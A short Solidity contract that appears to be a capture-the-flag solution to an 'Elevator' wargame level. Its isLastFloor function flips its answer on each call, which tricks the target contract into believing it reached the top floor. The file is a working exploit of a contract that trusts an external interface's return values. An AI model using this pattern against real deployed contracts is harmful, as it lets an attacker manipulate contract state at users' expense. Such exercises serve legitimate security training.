// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

/*
interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface Elevator {
   function goTo(uint _floor) external;
}
*/

import './Elevator.sol';

contract ElevatorMyHack is Building {

    bool top = true;

    function start(address elevator) public {
        Elevator(elevator).goTo(1);
    }

    function isLastFloor(uint) public returns (bool) {
        top = !top;
        return top;
    } 
}